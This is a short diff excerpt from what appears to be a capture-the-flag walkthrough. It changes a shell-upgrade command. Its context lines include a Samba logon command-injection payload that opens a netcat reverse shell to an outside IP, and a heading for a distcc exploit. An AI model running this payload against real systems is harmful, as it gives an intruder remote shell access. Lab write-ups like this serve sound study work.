@@ -43,7 +43,7 @@ smbclient //10.10.10.3/tmp
 logon "/=`nohup nc -nv 10.10.14.20 4444 -e /bin/sh`"
 ```
 ```
-python3 -c 'import pty;pty.spawn("/bin/bash")' 
+script -qc /bin/bash /dev/null 
 ```
 #   Exploitation #2: Distcc
 
